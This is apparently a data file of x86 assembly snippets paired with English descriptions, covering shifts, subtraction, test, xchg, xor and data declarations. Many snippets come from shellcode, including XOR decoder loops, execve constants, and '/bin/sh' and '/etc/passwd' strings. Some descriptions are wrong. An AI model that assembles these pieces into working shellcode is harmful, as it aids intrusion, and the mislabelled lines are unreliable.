shl eax, 1	multiply eax by 2 using left shift
shl eax, 1	multiply the value of eax by 2
shl eax, 16	left shift the contents of eax 16 bits
shl eax, 2	multiply eax by 4 using left shift
shl eax, 28	left shift the contents of eax register by 28 bit positions
shl eax, 5	left shift the contents of eax by 5 bit positions
shl eax,2	left shift eax by two bits
shl ebx, 1	multiply ebx by 2 using left shift
shl ebx, 2	multiply ebx by 4 using left shift
shl ebx, 8	left shift the contents of ebx by 8 bits
shl ecx, 1	multiply ecx by 2 using left shift
shl ecx, 2	multiply ecx by 4 using left shift
shl edi, 0x1	left shift the contents of the edi register by 0x1 bit
shl edx, 1	multiply edx by 2 using left shift
shl edx, 2	multiply edx by 4 using left shift
shl edx, 24	left shift the contents of the edx register by 24 bits
shl edx, 9	left shift the contents of edx register by 9 bit positions
shl edx, 9	left shift the contents of the edx register by 9 bits
shl esi, 0x1	left shift the contents of the esi register by 0x1 bit
shr [var], 3	right shift by 3 bit positions the contents of var variable
shr ax, 1	right shift ax by 1 bit
shr ax, cl	right shift the contents of the edi register by the contents of the cl register
shr bl, 4	right shift the contents of bl register by 4 bit positions
shr bl,4	right shift by 4 bits bl
shr dl, 1	right shift the contents of the dl register by 1 bit
shr dl, 4	right shift the contents of dl register by 4 bit positions
shr dl,1	right shift the contents of dl register by 1 bit positions
shr eax, 1	divide eax by 2 using right shift
shr eax, 16	right shift the contents of eax register by 16 bit positions
shr eax, 2	divide eax by 4 using right shift
shr eax, 24	right shift the contents of the eax register by 24 bit positions
shr eax, 28	right shift the contents of eax register by 28 bit positions
shr ebx, 1	divide ebx by 2 using right shift
shr ebx, 2	divide ebx by 4 using right shift
shr ebx, cl	right shift the contents of the ebx register by the contents of the cl register
shr ecx, 1	divide ecx by 2 using right shift
shr ecx, 2	divide ecx by 4 using right shift
shr edx, 1	divide edx by 2 using right shift
shr edx, 16	right shift the contents of the edx register by 16
shr edx, 2	divide edx by 4 using right shift
shr edx, byte 16	right shift the contents of the edx register by the byte 16
shr edx, byte 24	right shift the contents of the edx register by the byte 24
size: equ 1024	define size to be 1024 bytes large
size: equ 50000	declare a constant size and set equal to 50000
stage:	declare the stage label
stage:	define stage label
stageaddress:	declare the stageaddress label
start:	declare the start label
stc	set carry flag
str db 'hello',0	declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte
str db 'hey',0	declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively
string db 'test.txt'	define string as the byte string 'test.txt'
string: db '/bin/sh'	define string as the byte string '/bin/sh'
string: db '/etc/passwd'	define string as the byte string '/etc/passwd'
string: db 'file.txt'	define string as the byte string 'file.txt'
string: db 'file1.txt'	define string as the byte string 'file1.txt'
string: db 'prova.txt'	define string as the byte string 'prova.txt'
string: db 'tmp.txt'	define string as the byte string 'tmp.txt'
sub [var], esi	subtract the contents of esi from the 32-bit integer stored at memory location var
sub [var2], esi	subtract the contents of esi from the 32-bit integer stored at memory location var2
sub al, 0x41	subtract 0x41 from the al register
sub al, 1 \n jns l1	subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative
sub al, 1 \n jnz l1	subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero
sub al, 88	subtract 88 from the contents of al register and save the result in al
sub al, 88	subtract 88 from the contents of the al register
sub al, ah	subtract ah from al
sub al,0x13	subtract 0x13 from the al register
sub ax, 13	subtract 13 from ax and save the result into ax
sub ax, 1564	subtract 1564 from ax and save the result into ax
sub ax, 1564	subtract 1564 from the contents of ax register and save the result in ax
sub ax, 1564	subtract 1564 from the contents of the ax register
sub ax, 1662	subtract 1662 from ax and save the result into ax
sub ax, 1662	subtract 1662 from the contents of ax register and save the result in ax
sub ax, 1662	subtract the contents of the ax register by 1662
sub ax, ax	subtract the contents of ax from the contents of ax
sub bl, 0x7	subtract 0x7 from bl and save the result into bl
sub bl, 0x7	subtract 0x7 from the contents in bl and save the result in bl
sub bl, 3	subtract 3 from the contents of the bl register
sub bl, 3 \n jnz stage	subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero
sub bl, 4 \n jns l2	subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative
sub bl, 48	subtract the decimal value 48 from the nl register
sub bl, al	subtract the contents of al register from the contents of bl register and save the result in bl
sub bl, byte [esi]	subtract 0x7 from the byte in esi register
sub bl, cl \n jnz l2	subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero
sub bl,byte [esi]	subtract the byte in esi from the bl register
sub bx, 1634	subtract 1634 from bx and save the result into bx
sub bx, 1634	subtract 1634 from the contents of bx register and save the result in bx
sub bx, 1634	subtract 1634 from the contents of the bx register
sub bx, 1663	subtract 1663 from bx and save the result into bx
sub bx, 1663	subtract 1663 from the contents of the bx register
sub bx, 1663	subtract the contents of bx register by 1663 and save the result in bx
sub bx, bx	subtract the contents of bx from the contents of bx
sub bx, dx	subtract the contents of the dx register from the contents of the bx register
sub byte [buff],20h	subtract 20h from the 8-bit at memory location buff
sub byte [ebp+ecx],20h	subtract 20h from the 8-bit at memory location ebp+ecx
sub byte [esi], 0xd	subtract 0xd from the byte at the address esi
sub byte [esi], 13	subtract 13 from the byte at the address esi
sub byte [esi], 13	subtract 13 from the byte in esi and save the result in esi
sub cl, 1	subtract 1 from the contents of the cl register
sub cl, 1 \n jnz decode	subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero
sub cl, bl \n jns l3	subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative
sub cl, dl	subtract the contents of dl register from the contents of cl register and save the result in cl
sub cx, 0x7ff	subtract 0x7ff from the contents in cx and save the result in cx
sub cx, 0x7ff	subtract 0x7ff from the contents of cx register value and save the result in cx
sub cx, cx	subtract the contents of cx from the contents of cx
sub dl, 5 \n jns l4	subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative
sub dl, al	subtract the contents of al register from the contents of dl register and save the result in dl
sub dl, al \n jns decode_pr	subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative
sub dl, byte [esi]	subtract the byte at the address esi from the contents of the dl register
sub dx, 15444	subtract 15444 from dx and save the result into dx
sub dx, 15444	subtract 15444 from the contents of the dx register
sub dx, bx	subtract the contents of bx from the contents of dx
sub eax, [esp]	subtract the value of the memory at address esp from eax and store into eax
sub eax, 0x013ffeff	subtract 0x013ffeff from the contents in eax and save the result in eax
sub eax, 0x04feca01	subtract 0x04feca01 from the contents in eax and save the result in eax
sub eax, 0x0efc3532	subtract 0x0efc3532 from the contents in eax and save the result in eax
sub eax, 0x10	subtract 0x10 from eax
sub eax, 0x2c3d2dff	subtract 0x2c3d2dff from the contents in eax and save the result in eax
sub eax, 0x3217d6d2	subtract 0x3217d6d2 from the contents in eax and save the result in eax
sub eax, 0x3bd04ede	subtract 0x3bd04ede from the contents in eax and save the result in eax
sub eax, 0x70445eaf	subtract 0x70445eaf from the contents in eax and save the result in eax
sub eax, 216	subtract 216 from the value stored in eax
sub eax, 3	decrease eax by 3
sub eax, 3e716230	subtract 3e716230 from the contents of the eax register
sub eax, 5d455523	subtract 5d455523 from the contents of the eax register
sub eax, 5e5d7722	subtract 5e5d7722 from the contents of the eax register
sub eax, 8	subtract 8 from the contents of eax register and save the result in eax
sub eax, 8	subtract 8 from the contents of the eax register
sub eax, eax	subtract the contents of eax from the contents of eax
sub eax, ebx	subtract ebx from eax
sub eax, ebx	subtract the address in ebx from the address in eax
sub eax,20000h	subtract 20000h from eax register
sub ebx, 0x2e2aa163	subtract 0x2e2aa163 from ebx and save the result into ebx
sub ebx, 0x2e2aa163	subtract 0x2e2aa163 from the contents in ebx and save the result in ebx
sub ebx, 2	decrease ebx by 2
sub ebx, byte 3	subtract the byte 3 from the contents of the ebx register
sub ebx, byte 3	subtract the byte value 3 from the contents of ebx and save the result in ebx
sub ebx, byte 8	subtract the byte 8 from the contents of the ebx register
sub ebx, byte 8	subtract the byte value 8 from the contents of ebx and save the result in ebx
sub ecx, 0x04baca01	subtract 0x04baca01 from the contents in ecx and save the result in ecx
sub ecx, 0x0b454440	subtract 0x0b454440 from the contents in ecx and save the result in ecx
sub ecx, 0x1525152a	subtract 0x1525152a from the contents in ecx and save the result in ecx
sub ecx, 0x6374612e	subtract 0x6374612e from the contents in ecx and save the result in ecx
sub ecx, 1	decrease ecx by 1
sub ecx, 23	subtract 23 from the contents of the ecx register
sub ecx, ecx	subtract ecx from ecx and save the result into ecx
sub ecx, ecx	subtract the contents of ecx from the contents of ecx
sub ecx, ecx	subtract the contents of the ecx register from the contents of the ecx register
sub edi, 0x44444444	subtract 0x44444444 from edi and save the result in edi
sub edi, 0xffffffdf	subtract 0xffffffdf from edi
sub edi, 1768009314	subtract 1768009314 from the contents of the edi register
sub edi, 1768009314	subtract 1768009314 from the edi register and save the result in edi
sub edx, 4	decrease edx by 4
sub edx, edx	subtract the contents of the edx register from the contents of the edx register
sub esp, 0x24	subtract 0x24 from the contents in esp and save the result in esp
sub esp, 0x28	subtract the value 0x28 from the esp register
sub esp, 12	subtract 12 from esp register and save the result in esp
sub esp, 12	subtract 12 from the contents of the esp register
sub esp, 4	allocate memory for a variable
sub esp, 4	allocate memory for local variables
sub esp, 4	allocate memory for variable
sub esp, 4	allocate space on the stack for local variable
sub esp, 4	make room for one 4-byte local variable
sub esp, 4	make room on the stack for local variable
sub esp, 4	make space on stack
sub esp, 4	subtract the value 4 from the esp register and save the result in esp
sub esp, 8	subtract 8 from esp and save the result in esp
sub esp, byte 0x1	subtract the byte 0x1 from the contents of the esp register
sub esp, byte 0x1	subtract the byte value 0x1 from esp register and save the result in esp
sys_execve equ 0x0b	define sys_execve equal to 0x0b
syscall_execve equ 11	define syscall_execve equal to 11
test al, al	test the value of the al register
test al, al \n jz found \n inc ecx	jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
test al, al \n jz found \n inc ecx	if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register
test ax, ax	perform a bitwise and of the contents of ax and the contents of ax
test ax, ax \n jnz exeunt \n jmp carryon	jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon
test ax, ax \n jnz exeunt \n jmp carryon	if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon
test bl, bl \n jz not_found	jump to the label not_found if the contents of the bl register is not zero
test bl, bl \n jz not_found	if the contents of the bl register is not zero then jump to the label not_found
test cl, cl	test the value of cl
test dl, 0x1 \n jnz ready_to_proxy	jump to the label ready_to_proxy if the contents of the dl register is not zero
test dl, 0x1 \n jnz ready_to_proxy	if the contents of the dl register is not zero then jump to the label ready_to_proxy
test eax, eax	perform a bitwise and on the contents of the eax register
test eax, eax	test the value of eax
test eax, eax \n jnz _convert	jump to the label _convert if the contents of the eax register is not zero
test eax, eax \n jnz _convert	if the contents of the eax register is not zero then jump to the label _convert
test eax, eax \n jnz _parent \n pop ecx	jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register
test eax, eax \n jnz _parent \n pop ecx	if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register
test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6	jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register
test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6	if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register
test eax, eax \n jnz checkforfile	jump to the label checkforfile if the contents of the eax register is not zero
test eax, eax \n jnz checkforfile	if the contents of the eax register is not zero then jump to the label checkforfile
test eax, eax \n jnz do_next_accept	jump to the label do_next_accept if the contents of the eax register is not zero
test eax, eax \n jnz do_next_accept	if the contents of the eax register is not zero then jump to the label do_next_accept
test eax, eax \n jnz exit_on_error	jump to the label exit_on_error if the contents of the eax register is not zero
test eax, eax \n jnz exit_on_error	if the contents of the eax register is not zero then jump to the label exit_on_error
test eax, eax \n jnz l1	jump to the label l1 if the contents of the eax register is not zero
test eax, eax \n jnz l1	if the contents of the eax register is not zero then jump to the label l1
test eax, eax \n jnz l1 \n call myfunct	jump to the label l1 if the contents of the eax register is not zero else call the function myfunct
test eax, eax \n jnz l1 \n call myfunct	if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct
test eax, eax \n jnz l4 \n call search	jump to the label l4 if the contents of the eax register is not zero else call the function search
test eax, eax \n jnz l4 \n call search	if the contents of the eax register is not zero then jump to the label l4 else call the function search
test eax, eax \n jnz short _parent	jump short to the label _parent if the contents of the eax register is not zero
test eax, eax \n jnz short _parent	if the contents of the eax register is not zero then jump short to the label _parent
test eax, eax \n js _while_loop	jump to the label _while_loop if the contents of the eax register is negative
test eax, eax \n js _while_loop	if the contents of the eax register is negative then jump to the label _while_loop
test eax, eax \n js close	jump to the label close if the contents of the eax register is negative
test eax, eax \n js close	if the contents of the eax register is negative then jump to the label close
test eax, eax \n js old_dirent	jump to the label old_dirent if the contents of the eax register is negative
test eax, eax \n js old_dirent	if the contents of the eax register is negative then jump to the label old_dirent
test eax, eax \n js short socket	jump short to the label socket if the contents of the eax register is negative
test eax, eax \n js short socket	if the contents of the eax register is negative then jump short to the label socket
test eax, eax \n jz check_html	jump to the label check_html if the contents of the eax register is zero
test eax, eax \n jz check_html	if the contents of the eax register is zero then jump to the label check_html
test eax, eax \n jz check_html \n jmp while	jump to the label check_html if the contents of the eax register is zero else jump to the while label
test eax, eax \n jz check_html \n jmp while	if the contents of the eax register is zero then jump to the label check_html else jump to the while label
test eax, eax \n jz close	jump to the label close if the contents of the eax register is zero
test eax, eax \n jz close	if the contents of the eax register is zero then jump to the label close
test eax, eax \n jz close \n mov ebx, edx	jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register
test eax, eax \n jz close \n mov ebx, edx	if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register
test eax, eax \n jz proc_name	jump to the label proc_name if the contents of the eax register is zero
test eax, eax \n jz proc_name	if the contents of the eax register is zero then jump to the label proc_name
test eax, eax \n jz ready_to_proxy	jump to the label ready_to_proxy if the contents of the eax register is zero
test eax, eax \n jz ready_to_proxy	if the contents of the eax register is zero then jump to the label ready_to_proxy
test eax, eax \n jz short loc_402B13	jump short to the memory location loc_402B13 if the contents of the eax register is zero
test eax, eax \n jz short loc_402B13	if the contents of the eax register is zero then jump short to the memory location loc_402B13
test eax, eax \n jz short loc_402C13	jump short to the memory location loc_402C13 if the contents of the eax register is zero
test eax, eax \n jz short loc_402C13	if the contents of the eax register is zero then jump short to the memory location loc_402C13
test eax, eax \n jz socket	jump to the label socket if the contents of the eax register is zero
test eax, eax \n jz socket	if the contents of the eax register is zero then jump to the label socket
test eax, eax \n jz socket \n xor eax, eax	jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register
test eax, eax \n jz socket \n xor eax, eax	if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register
test eax, eax \n jz write \n xor eax, eax	jump to the label write if the contents of the eax register is zero, else zero out the contents of the eax register
test eax, eax \n jz write \n xor eax, eax	if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register
test ebx, ebx	test the contents of the ebx register
test ebx, ebx \n js short l1	jump short to the label l1 if the contents of the ebx register is negative
test ecx, ecx	test the contents of the ecx register
test edx, edx	test the contents of the edx register
test si, 01h	perform and operation between si and 01h
three:	declare the three label
todo:	declare the todo label
total_students equ 50	define constant total_students equal to 50
two:	declare the two label
two:	define two label
up:	declare the up label
var db 32	declare var byte variable and initialize it to 32
var db 64	declare a byte containing the value 64 at label the memory location var
var_a db 232	allocate one byte of memory for var_a variable and initialize it to 232
var_a: dd 0x0	create the doubleword variable var_a in memory and initialize it to zero
var_b db 'c'	allocate one byte of memory for var_b variable and initialize it to 'c'
var2 db ?	declare an uninitialized byte labeled var2
var2 db ?	declare an uninitialized byte referred to as location var2
variablename1: resb 1	reserve 1 byte for variableName1
variablename2: resw 1	reserve 1 word for variableName2
variablename3: resd 1	reserve 1 double word for variableName3
word_table dw 134, 345, 564, 123	declare the array of words word_table initialized to 134 345 564 and 123
word_value dw 300	define the word value word_value and initialize it to 300
word1 word 65535	define word1 unsigned word and initialize it to 65535
word2 sword 32768	define word2 signed word and initialize it to -32768
word3 word ?	define word3 uninitialized unsigned word
wordvar: resw 1	reserve a word for wordvar
wrap_around:	declare the wrap_around label
write_syscall equ 4	define write_syscall equal to 4
write:	declare the write label
writestring:	declare the writestring label
writestring:	define writestring function
x dw ?	declare a word uninitialized value referred to as location x
x dw ?	declare an uninitialized word labeled x
xchg [ebp+16], ecx	swap the address [ebp+16] with the contents of the ecx register
xchg [ebp+16], ecx	swap the contents in ebp+16 and ecx
xchg eax, ebx	exchange eax with ebx
xchg eax, ebx	swap the contents of eax and ebx
xchg eax, ebx	swap the contents of the eax register with the contents of the ebx register
xchg eax, ecx	swap the contents of the eax register with the contents of the ecx register
xchg eax, edx	swap the contents of the eax register with the contents of the edx register
xchg eax, esi	swap the contents of eax and esi
xchg eax, esi	swap the contents of the eax register with the contents of the esi register
xchg ebx, eax	exchange the contents of the ebx register with the contents of the eax register
xchg ebx, eax	swap the contents of the ebx register with the contents of the eax register
xchg ebx, eax	swap the values of ebx and eax
xchg ebx, eax	swap the values of ebx and eax registers
xchg ebx, ecx	exchange ebx with ecx
xchg ebx, edx	swap the contents of the ebx register with the contents of the edx register
xchg ebx, esp	swap the contents of the ebx register with the contents of the esp register
xchg ebx, esp	swap the values of ebx and esp registers
xchg ecx, edx	exchange ecx with edx
xchg ecx, edx	swap the contents of the ecx register with the contents of the edx register
xchg edi, eax	swap the contents of the edi register with the contents of the eax register
xchg edi, eax	swap the values of edi and eax registers
xchg edx, eax	exchange edx with eax
xchg edx, eax	swap the values of edx and eax registers
xchg edx, ebx	swap the values of edx and ebx registers
xchg esi, eax	swap the contents of the esi register with the contents of the eax register
xchg esi, eax	swap the values of esi and eax
xchg esi, ebx	swap the values of esi and ebx
xchg esp, esi	swap the values of esp and esi registers
xchg si, bx	swap the values si ebx and bx registers
xor [ebx], word __flag_byte	perform xor operation between ebx register and the word __flag_byte and save the result in ebx
xor [ecx + 116], bh	perform a logical xor between the address speicified by [ecx + 116] and the bh register and save the result in [ecx + 116]
xor [ecx + 116], bh	perform xor operation between the value stored at the location ecx+116 and bh
xor [ecx + 116], dh	perform a logical xor between the address speicified by [ecx + 116] and the dh register and save the result in [ecx + 116]
xor [ecx + 116], dh	perform xor operation between the value stored at the location ecx+116 and dh
xor [ecx], bh	perform the xor operation between the value stored at the location ecx and bh
xor [ecx], dh	perform the xor operation between the value stored at the location ecx and dh
xor ah, ah	clear the ah register
xor ah, ah	zero out ah register
xor al, 0e9h	perform a logical xor between the al register and 0e9h and save the result in al
xor al, 0x30	perform the xor operation between the al register and the value 0x30
xor al, 0x41	perform the xor operation between the al register and the value 0x41
xor al, 0x4a	perform the xor operation between the al register and the value 0x4a
xor ax, 0x3041	perform the xor operation between the ax register and the value 0x3041
xor ax, 0x4f73	perform the xor operation between the ax register and the value 0x4f73
xor ax, 0x539	perform a xor operation between ax and 0x539 and save the result in ax
xor ax, 0x539 \n jz decoded_shellcode	jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero
xor ax, 0x7777	perform the xor operation between the contents of the ax register and the value 0x7777
xor ax, ax	clear the ax register
xor ax, ax	zero out ax register
xor ax, bx	perform a logical xor between the bx register and the ax register and save the result in ax
xor ax, bx \n jz call_decoded	jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero
xor bl, 0xbb	perform a logical xor between the bl register and 0xbb and save the result in bl
xor bl, 0xbb	zero out bl register
xor bl, 0xBB \n jz encoded	jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero
xor bl, 0xBB \n jz formatting	jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero
xor bx, bx	initialize bx to 0
xor bx, bx	clear the bx register
xor bx,bx	zero out bx register
xor byte [esi + ecx - 1], 0x3	perform a logical xor between the byte at the address speicified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1]
xor byte [esi], 0x2c	perform the xor operation between the byte starting at the addess in esi and the value 0x2c
xor byte [esi], cl	perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]
xor byte [esi], cl	perform a xor operation between a byte in esi and cl
xor byte [esi+ecx],0x0f	perform the xor operation between the byte at memory location esi+ecx and 0x0f
xor cl, 0x32	perform the xor operation between cl and 0x32 and store the resut in cl
xor cl, 0x32 \n jz short EncodedShellcode	jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero
xor cl, 0xaa	perform a logical xor between the cl register and 0xaa and save the result in cl
xor cl, 0xaa	perform the xor operation between cl and 0xaa and store the result in cl
xor cl, 0xAA \n jnz Next_Cycle	jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero
xor cl, 0XAA \n jz shift_decode	jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero
xor dl, 0xbb	perform a logical xor between the dl register and 0xbb and save the result in dl
xor dl, 0xbb	perform the xor operation between dl and 0xbb and store the result in dl
xor dl, 0xBB \n jz Next_Cycle	jump to the Next_Cycle label if the result of the logical xor between the dl register and the value 0xBB is zero
xor eax, [edi]	perform the xor operation between eax register and edi register and store the result in eax
xor eax, [esi]	perform xor operation between eax register and esi register and store the result in eax
xor eax, 0x58494741	perform a logical xor between the eax register and 0x58494741 and save the result in eax
xor eax, 0x58494741	perform the xor operation between eax and 0x58494741 value and store the result in eax
xor eax, 0x6e696230	perform the xor operation between the eax register and the value 0x6e696230
xor eax, 0x7575	perform a logical xor operation between eax and 0x7575
xor eax, 0xffffffff	perform a logical xor between the eax register and 0xffffffff and save the result in eax
xor eax, eax	initialize eax with decimal value 0
xor eax, eax	clear the eax register
xor eax, eax	init eax 0
xor eax, eax	perform xor operation between eax and eax
xor eax, eax	reset both lower and uppper bytes of eax to be 0
xor eax, eax	reset eax
xor eax, eax	set eax to 0
xor eax, eax	set the eax register to null
xor eax, eax	zero out eax
xor eax, eax	zero out the eax register
xor eax, eax \n cmp edx, eax \n je l3	zero out the eax register and jump to the l3 label if the contents of the edx register is equal to the contents of the eax register
xor eax, eax \n cmp edx, eax \n jne l3	zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register
xor eax, eax \n push eax	zero out the eax register and push zero onto the stack
xor eax, eax \n push eax	push zero onto the stack
xor eax, eax \n push eax	clear the eax register and push its contents onto the stack
xor eax, ebx	perform a logical xor between the eax register and the ebx register and save the result in eax
xor eax, ebx	perform xor operation between eax register and ebx register and store the result in eax
xor eax, edi	perform a logical xor between the eax register and the edi register and save the result in eax
xor eax, esi	perform a logical xor between the eax register and the esi register and save the result in eax
xor ebp, ebp	clear ebp register
xor ebx, ebp	perform a logical xor between the ebx register and the ebp register and save the result in ebx
xor ebx, ebx	initialize ebx with 0
xor ebx, ebx	clear ebx
xor ebx, ebx	clear ebx register
xor ebx, ebx	clear the ebx register
xor ebx, ebx	init ebx 0
xor ebx, ebx	reset both lower and uppper bytes of ebx to be 0
xor ebx, ebx	reset ebx to 0
xor ebx, ebx	set the ebx register to null
xor ebx, ebx	zero out ebx
xor ebx, ebx	zero out the ebx register
xor ebx, ebx \n cmp eax, ebx \n je exit	zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
xor ebx, ebx \n cmp eax, ebx \n jne exit	zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register
xor ebx, ebx \n mul ebx	zero out the eax and ebx register
xor ebx, ebx \n mul ebx	zero out the eax register and the ebx register
xor ebx, ebx \n push ebx	zero out the ebx register and push zero onto the stack
xor ebx, ebx \n push ebx	push zero onto the stack
xor ebx, ebx \n push ebx	clear the ebx register and push its contents onto the stack
xor ebx, word __flag_byte	perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx
xor ecx, bh	perform a logical xor between the ecx register and the bh register and save the result in ecx
xor ecx, dh	perform a logical xor between the ecx register and the dh register and save the result in ecx
xor ecx, ecx	initialize ecx to zero
xor ecx, ecx	initialize ecx with decimal value 0
xor ecx, ecx	clear ecx
xor ecx, ecx	clear ecx register
xor ecx, ecx	clear the ecx register
xor ecx, ecx	reset both lower and uppper bytes of ecx to be 0
xor ecx, ecx	reset ecx to 0
xor ecx, ecx	set the ecx register to null
xor ecx, ecx	zero out ecx
xor ecx, ecx	zero out the ecx register
xor ecx, ecx \n cmp ebx, ecx \n je l1	zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register
xor ecx, ecx \n cmp ebx, ecx \n jne l1	zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register
xor ecx, ecx \n mul ecx	zero out eax and ecx
xor ecx, ecx \n mul ecx	zero out the eax register and the ecx register
xor ecx, ecx \n push ecx	zero out the ecx register and push zero onto the stack
xor ecx, ecx \n push ecx	push zero onto the stack
xor ecx, ecx \n push ecx	clear the ecx register and push its contents onto the stack
xor edi, edi	initialize edi with 0
xor edi, edi	clear the edi register
xor edi, edi	init edi 0
xor edx, edx	initialize edx with the decimal value 0
xor edx, edx	initialize edx with the hexadecimal value 0x0
xor edx, edx	clear edx
xor edx, edx	clear edx register
xor edx, edx	clear the edx register
xor edx, edx	reset edx to 0
xor edx, edx	set the contents of edx to zero
xor edx, edx	set the edx register to null
xor edx, edx	zero out edx
xor edx, edx	zero out the edx register
xor edx, edx \n cmp ecx, edx \n je l2	zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register
xor edx, edx \n cmp ecx, edx \n jne l2	zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register
xor edx, edx \n mul edx	zero out eax and edx
xor edx, edx \n mul edx	zero out the eax and edx register
xor edx, edx \n push edx	zero out the edx register and push zero onto the stack
xor edx, edx \n push edx	push zero onto the stack
xor edx, edx \n push edx	clear the edx register and push its contents onto the stack
xor esi, esi	initialize the esi register with the decimal value 0
xor esi, esi	clear the esi register
xor esi, esi	init the esi register to 0
xor zero_reg, zero_reg	clear zero_reg
xor zero_reg, zero_reg	zero out zero_reg
y dd 3000	declare a doubleword at address y initialized to contain 3000
y: dd 0x0	create the doubleword variable y in memory and initialize it to zero
ymmval: resw 1	reserve one word for ymmval
z dd 1, 2, 3	declare three doubleword values initialized to 1 2 and 3 at address z
z dd 1,2,3	declare three doublewords of memory starting at address z and initialized to 1 2 and 3
z: dd 0x0	create the doubleword variable z in memory and initialize it to zero
